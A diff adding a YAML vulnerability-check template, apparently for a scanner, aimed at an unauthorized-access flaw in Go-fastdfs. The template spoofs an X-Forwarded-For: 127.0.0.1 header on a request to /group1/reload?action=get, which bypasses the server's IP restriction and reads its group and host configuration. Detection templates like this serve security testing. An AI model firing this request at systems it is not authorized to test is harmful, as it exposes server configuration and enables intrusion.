@@ -1,0 +1,25 @@
+id: poc-yaml-go-fastdfs-getclientip-unauthorized-access
+info:
+  name: Go-fastdfs GetClientIp 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: Go-fastdfs
+requests:
+- method: GET
+  path: /group1/reload?action=get
+  headers:
+    X-Forwarded-For: 127.0.0.1
+  expression: 'status_code == 200
+
+    && contains(body,"\"status\": \"ok\"")
+
+    && contains(body,"\"group\": \"group1\"")
+
+    && !contains(body,"<")
+
+    && contains(body,"host")
+
+    '
+variables: {}
+transport: http
